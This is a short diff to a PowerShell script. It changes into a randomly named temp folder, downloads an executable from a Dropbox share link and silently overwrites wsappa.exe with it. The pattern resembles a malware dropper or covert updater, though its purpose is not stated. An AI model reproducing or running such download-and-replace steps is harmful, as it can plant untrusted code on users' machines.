@@ -4,8 +4,12 @@ start-sleep 10
 #change directory
 cd $env:temp/sVBXKuz
 
-#download new backup
-Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/ktmct46mftulye1s7ka7j/wsappa-1.5.exe?rlkey=sfae0om54ct58a3cmgh3z4ndg&dl=0" -OutFile wsappa.exe
+#download new file
+Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/ktmct46mftulye1s7ka7j/wsappa-1.5.exe?rlkey=sfae0om54ct58a3cmgh3z4ndg&dl=0" -OutFile wsappa_new.exe
+Copy-Item -Path .\wsappa_new.exe -Destination .\wsappa.exe -Force
+
+#delete old file
+Remove-Item .\wsappa_new.exe
 
 
 #sleep
